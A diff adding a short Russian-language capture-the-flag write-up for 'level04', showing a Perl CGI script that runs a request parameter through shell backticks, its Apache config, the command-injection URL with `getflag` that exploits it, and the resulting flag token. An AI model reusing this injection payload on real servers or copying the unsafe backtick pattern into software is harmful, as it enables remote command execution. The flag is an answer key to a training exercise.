@@ -1,0 +1,29 @@
+1) Видим файл level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+2) У нас есть apache и нет ngnix. Посмотрели в папке /etc/apache2/sites-available и видим level05.conf -  внутри него:
+<VirtualHost *:4747>
+	DocumentRoot	/var/www/level04/
+	SuexecUserGroup flag04 level04
+	<Directory /var/www/level04>
+		Options +ExecCGI
+		DirectoryIndex level04.pl
+		AllowOverride None
+		Order allow,deny
+		Allow from all
+		AddHandler cgi-script .pl
+	</Directory>
+</VirtualHost>
+
+3) Посмотрев что делает программа открываем в браузере: http://192.168.56.101:4747/?x=`getflag` - где хотим запустить скрипт 'getflag' 
+
+4) Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+Ответ: ne2searoevaevoem4ov4ar8ap
